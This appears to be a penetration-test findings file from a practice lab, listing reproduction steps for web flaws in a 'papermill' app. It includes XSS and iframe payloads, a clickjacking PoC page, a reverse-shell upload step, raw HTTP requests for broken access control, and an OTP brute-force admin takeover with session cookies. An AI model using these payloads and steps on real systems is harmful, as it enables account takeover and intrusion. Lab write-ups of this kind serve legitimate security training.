@@ -1,0 +1,319 @@
+Clickjacking
+"1. Create an HTML file and add the following code 
+ <pre lang=""JavaScript"" line=""1"">
+ <html>
+ <head>
+ <title>ClickJacking PoC</title>
+ </head>
+ ClickJacking PoC
+ <h2>Your Web Application Can be Mounted within an iFrame which makes it vulnerable to ClickJacking!</h2>
+ <iframe src=""https://target.web.crproxy.myexercises.in/"" height=""450"" width=""1000""></iframe>
+ </body>
+ </html>
+ </pre>
+ 2. Save the HTML code and open the file in any web browser."
+=======================================================================
+
+CRLF Injection
+"Step 1: Login to the papermill application, Navigate to Profile Details - Organisation Address
+ Step 2: Fill out the organisation address and intercept the request as shown.
+ Step 3: Inject the crlf chars as shown and append a value after the crlf chars as shown.
+ Step 4: Forward the request and you observe the org address is successfully updated with the appended word after the crlf chars injected in a new line as shown with the crlf chars injected in between in the application UI."
+=======================================================================
+
+Content Spoofing (Text Injection)
+"Step 1: On the Registration Successful page, in the url path after /msg/ contains the password in base64 format.
+ Step 2: Input a base 64 encoded spoofed content as shown to lure victims to visit a look alike fake site luring the user to input their credentials and hence stealing the same."
+=======================================================================
+
+Iframe Injection
+"Step 1: Login to and go to https://target.web.crproxy.myexercises.in/v1/client/profile
+ Step 2: Update the first name intercept the request and change the name to <iframe%20src=https://bing.com>
+ Step 3: Then go to https://target.web.crproxy.myexercises.in/ you will see Iframe"
+======================================================================
+
+Stored XSS
+"Instance 1:
+ Step 1: Login to and go to https://target.web.crproxy.myexercises.in/v1/client/profile
+ Step 2: Update the first name intercept the request and change the name to <img%20src=""x""%20onerror=""alert(1);"">
+ Step 3: Then go to https://target.web.crproxy.myexercises.in/ alert will popup
+ 
+ Instance 2:
+ Step 1: Login to and go to https://target.web.crproxy.myexercises.in/v1/client/profile
+ Step 2: Update the Organization Address intercept the request and change the Address to <img%20src=""x""%20onerror=""alert(1);"">
+ 
+ Instance 3:
+ Step 1: Login to and go to https://target.web.crproxy.myexercises.in/v1/client/profile
+ Step 2: Update the mobile number and intercept the request and change the mobile number to <script>alert(1)</script>
+ Step 3: Then go to https://target.web.crproxy.myexercises.in/v1/client/cart alert will popup"
+======================================================================
+
+Application allows Blank Password Login
+"Step 1: Login to the papermill application by entering the email and with the blank password, the application throws an exception that the password cannot be left blank.
+ Step 2: Now enter a random password and intercept the request and remove the password value from the password parameter and forward the request to the server.
+ Step 3: The application accepts blank password and successfully logs in the user as shown below."
+=====================================================================
+
+Missing Antivirus/Antimalware scan on uploded files
+"1. Go to https://target.web.crproxy.myexercises.in/v1/adm/add-items. Upload .reverseShell.php file along with other details and click on ""Upload"".
+ 2. Click Submit and observe that the file is inserted successfully (where only image is allowed). 
+ 
+ This confirmed that there was no content type validation on uploaded files and the server did not have antivirus/antimalware installed or properly configured."
+=======================================================================
+
+Vertical Pirvillege esscallation
+"1. Log in as a normal user and go to Dashboard.
+ 2. Go to the cart ""/client/cart"" functionality and submit the transaction number.
+ 3. Observer the response there is a new directory ""/v1/adm/dashboard""
+ 4. Take that directory ""/v1/adm"" and enumerate for the other endpoint, found new endpoints ""employee, inventory, masters, orders"".
+ 5. Once we visit these endpoints we can see the new portal and able to use all functionality."
+======================================================================
+
+Cross site Request Forgery
+"1. Login to the application and navigate to v1/adm/add-items. Under Add Items section, fill in all the required details for Master Paper Board. Upload a product picture and click on Submit.
+ 2. Capture the above request in a proxy tool like Burpsuite. The raw HTTP request is shown below.
+ 3. Send this request to generate a CSRF proof of concept. A csrf html page is crafted which will add a new product via a CSRF attack.
+ 4. To demonstrate, open another browser. Login in to the application and now open the CSRF crafted html page in the next tab of the same browser. Click on Submit Request as shown below.
+ 5. Observe the response. The request is sussessfully submitted as shown below.
+ 6. To very, navigate to Add Items and see the new product is added via a CSRF attack (Product number 11 named ""CSRF"")."
+=======================================================================
+
+Pasword field with autocomplete enabled
+"1. Redirect to the login page https://target.web.crproxy.myexercises.in/login and enter the login credentials.
+ 2. Capture the request in the burp suite and send it to the repeater, submit the request.
+ 3. Observe the response, the form does not contain autocomplete=off"
+======================================================================
+
+Cleartext submission of user login credentials
+"1. Log in to the application and intercept the request.
+ 2. Check whether the value of the password parameter is encrypted or not."
+=======================================================================
+
+No Captcha on Login and Sign Up Pages
+"1. Visit the Login page.
+ 2. Visit the Sign Up page. On both the pages, Captcha is not found/implemented."
+=======================================================================
+
+Apache Tomcat Manager Console Enabled
+Access the endpoint /manager to get the login prompt of the apache tomact manager as shown.
+======================================================================
+
+Stack trace enabled
+Visit the vulnerable link and observe the stack trace details.
+======================================================================
+
+Private IP address disclosed
+"1. Visit the login page and send the captured request. 
+ 2. Observe the HTTP response header ""access-control-allow-origin"" for the IP address as shown in the screenshot below."
+======================================================================
+
+Broken access control
+"Instance 1: For Approve
+ Step 1: Hit this Request in burp suite
+ 
+ POST /v1/api/orders/status HTTP/2
+ Host: target.web.crproxy.myexercises.in
+ Cookie: shell= CRPROXY=1-3; SESSION=
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: application/x-www-form-urlencoded
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 19
+ Origin: https://target.web.crproxy.myexercises.in
+ Referer: https://target.web.crproxy.myexercises.in/v1/adm/orders
+ Sec-Fetch-Dest: empty
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Site: same-origin
+ Te: trailers
+ 
+ status=A&orderID=34
+ 
+ Instance 2:For decline 
+ Step 1: Hit this Request in burp suite
+ POST /v1/api/orders/status HTTP/2
+ Host: target.web.crproxy.myexercises.in
+ Cookie: shell=; CRPROXY=1-3; SESSION=
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: application/x-www-form-urlencoded
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 19
+ Origin: https://target.web.crproxy.myexercises.in
+ Referer: https://target.web.crproxy.myexercises.in/v1/adm/orders
+ Sec-Fetch-Dest: empty
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Site: same-origin
+ Te: trailers
+ 
+ status=D&orderID=34
+ 
+ 
+ Instance 3: For Complete
+ Step 1: Hit this Request in burp suite
+ POST /v1/api/orders/status HTTP/2
+ Host: target.web.crproxy.myexercises.in
+ Cookie: shell= CRPROXY=1-3; SESSION=
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: application/x-www-form-urlencoded
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 18
+ Origin: https://target.web.crproxy.myexercises.in
+ Referer: https://target.web.crproxy.myexercises.in/v1/adm/active-orders
+ Sec-Fetch-Dest: empty
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Site: same-origin
+ Te: trailers
+ 
+ status=F&orderID=5
+ 
+ 
+ Instance 4: For cancel
+ Step 1: Hit this Request in burp suite
+ POST /v1/api/orders/status HTTP/2
+ Host: target.web.crproxy.myexercises.in
+ Cookie: shell=; CRPROXY=1-3; SESSION=
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: application/x-www-form-urlencoded
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 18
+ Origin: https://target.web.crproxy.myexercises.in
+ Referer: https://target.web.crproxy.myexercises.in/v1/adm/active-orders
+ Sec-Fetch-Dest: empty
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Site: same-origin
+ Te: trailers
+ 
+ status=C&orderID=5
+ 
+ 
+ Instance 5: For verify
+ Step 1: Hit this Request in burp suite
+ POST /v1/api/product/verify HTTP/2
+ Host: target.web.crproxy.myexercises.in
+ Cookie: shell=; CRPROXY=1-3; SESSION=
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: application/x-www-form-urlencoded
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 6
+ Origin: https://target.web.crproxy.myexercises.in
+ Referer: https://target.web.crproxy.myexercises.in/v1/adm/add-items
+ Sec-Fetch-Dest: empty
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Site: same-origin
+ Te: trailers
+ 
+ pid=14
+ 
+ Instance 6: For Delete 
+ Step 1: Hit this Request in burp suite
+ DELETE /v1/api/product/delete/23 HTTP/2
+ Host: target.web.crproxy.myexercises.in
+ Cookie: shell= CRPROXY=1-3; SESSION=
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: application/x-www-form-urlencoded
+ X-Requested-With: XMLHttpRequest
+ Origin: https://target.web.crproxy.myexercises.in
+ Referer: https://target.web.crproxy.myexercises.in/v1/adm/add-items
+ Sec-Fetch-Dest: empty
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Site: same-origin
+ Te: trailers"
+=======================================================================
+
+Lack of Security Headers
+"Inspect the application response as the following 4 security response headers are not configured:
+ Header name: x-frame-options.
+ Header name: x-content-type-options.
+ Header name: content-security-policy.
+ Header name: x-permitted-cross-domain-policies."
+======================================================================
+
+Browser cross-site scripting filter disabled
+"Inspect the application response to observe the following response headers misconfigured:
+ X-XSS-Protection: 0, which is to be configured as X-XSS-Protection: 1; mode=block"
+======================================================================
+
+Cacheable HTTPS response
+"Inspect the application response to observe the following response headers are not configured:
+ Cache-control: no-store
+ Pragma: no-cache"
+======================================================================
+
+File upload Directory Accessible
+Access the endpoint /files to see that the upload directory is accessible to the end user which might contain sensitive information and is not recommended to be accessible to all users or have public access.
+======================================================================
+
+No Rate Limiting Enforced on OTP Verification
+"Step 1: Navigate to the forgot password flow and enter a valid email registered with the application.
+ Step 2: Now enter the email, otp, new password and confirm password field and intercept the request.
+ Step 3: Forward the request to intruder and perform brute force on the OTP field to match the correct OTP.
+ Step 4: It is observed that there is no rate limiting configured or cap on the no. of requests sent to the server in a small time interval a shown."
+======================================================================
+
+Cookie No HTTP Only Flag and samesite attribute
+
+"1. Login to the application
+ 2. Redirect to https://target.web.crproxy.myexercises.in/v1/client/profile
+ 3. Capture the request in the burp suite and send it to the repeater, submit the request.
+ 4. No HTTP Only Flag and Samesite attribute is set in response"
+=======================================================================
+
+Admin Account Takeover(Challenge 1)
+"Step 1: Go to Forgot Password Page
+ Step 2: Enter admin mail and click on reset
+ Step 3: Enter OTP 0000 and intercept that request it will look like this
+ 
+ POST /api/v1/otp/submit HTTP/2
+ Host: n8ygaturepisujmmmjylikxdoz.web.crproxy.myexercises.in
+ Cookie: shell=s%3A0c06e9ebd9394b25b9c6ff868b44fc577e060d1bbfe16de43cabc8e1.VklbDtI052yWEkQFQgeQjwPLE4pHHjci3%2BZlMjErIug; CRPROXY=1-1; SESSION=ZWQxYTYxZGQtYmJhYy00MDdkLTgyMzAtYjQxYWNlMzQ4YjU4
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate, br
+ Content-Type: application/x-www-form-urlencoded
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 77
+ Origin: https://n8ygaturepisujmmmjylikxdoz.web.crproxy.myexercises.in
+ Referer: https://n8ygaturepisujmmmjylikxdoz.web.crproxy.myexercises.in/otp?email=admin%40papermill.com
+ Sec-Fetch-Dest: empty
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Site: same-origin
+ Te: trailers
+ 
+ email=admin%40papermill.com&code=0000&npasswd=Admin%40123&cpasswd=Admin%40123
+ 
+ Step 4: Change the v3 to v1 and send it to intruder
+ Step 5: Bruteforce the otp from 0000 to 9999
+ Step 6: Check the content length password will successfully changed"
+=======================================================================
+
+Password Sent in URL
+"Step1: From the registration signup page, enter the details as shown.
+ Step 2: It is observed the password is sent in the ul in base64 encoded format with the tendency of getting cached in referrer fields and browser cache as shown."
+=======================================================================
+
+Weak User Registration Flow
+"Step1: From the registration signup page, enter the details as shown.
+ Step 2: In the next flow the password is sent in the url in base64 encoded format without verifying the user's identity by sending the password in the email provided by the user along with the email address verification through an email link which is not as per good security practice."
+=======================================================================
+
+Missing Custom Error Pages
+"Step 1: In the url path shown, inject a single quote character to get the custom whitelabel error page.
+ Step 2: Now inject a null byte character as shown and the appliocation throws a general error with 400 code and not the custom whitelabel error page as above."
+=======================================================================
